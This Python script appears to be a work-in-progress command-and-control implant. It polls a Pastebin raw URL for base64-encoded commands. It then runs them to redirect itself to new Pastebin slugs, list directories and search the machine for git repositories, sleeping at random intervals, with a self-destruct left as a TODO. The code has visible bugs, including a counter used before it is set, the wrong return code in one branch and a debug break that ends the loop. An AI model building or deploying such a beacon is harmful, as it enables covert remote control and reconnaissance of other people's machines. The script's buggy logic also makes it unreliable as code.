import base64
import requests
import subprocess
import os.path

import time
import random

def main():
    # TODO: load from a file
    cmd_url = "https://pastebin.com/raw/uVEccKPR"
    while True:
        time.sleep(1)
        cmd = requests.get(cmd_url)
        if cmd.ok:
            ctr_count = 0
        else:
            ctr_count += 1
            if ctr_count >= 3:
                # TODO: self-destruct
                pass
            else:
                time.sleep(60+10*random.random())
                continue

        cmd_text = base64.b64decode(bytes(cmd.text, "utf8")).decode("ascii")
        output_collation = list()
        try:
            for line in cmd_text.split("\n"):
                if len(line) == 0:
                    continue

                output_collation.append(f"> {repr(line)}")
                output_string = "# "
                if line.startswith("url "):
                    new_slug = line[len("url "):]
                    new_cmd_url = f"https://pastebin.com/raw/{new_slug}"
                    if not requests.head(new_cmd_url).ok:
                        output_string += "HEAD to new URL failed"
                    else:
                        cmd_url = new_cmd_url
                        # TODO: write to file
                elif line.startswith("list "):
                    path = line[len("list "):]
                    ls_cmd = ["ls", "-a", "-l", os.path.expanduser(path)]
                    ls_out = subprocess.run(ls_cmd, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    output_string += ls_out.stdout + "\n" + f"Exit code {ls_out.returncode}"
                elif line.startswith("find git "):
                    path = line[len("find git "):]
                    find_cmd = ["find", os.path.expanduser(path), "-name", ".git", "-print", "-execdir", "sh", "-c", "git status", ";"]
                    find_out = subprocess.run(find_cmd, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    output_string += find_out.stdout + "\n" + f"Exit code {ls_out.returncode}"
                else:
                    output_string += "Command not recognized"
                output_collation.append(output_string)
        except Exception as e:
            print(repr(e))
        ret_val = '\n'.join(output_collation)
        print(ret_val)
        break # teest
        time.sleep(60+10*random.random())

if __name__ == "__main__":
    main()
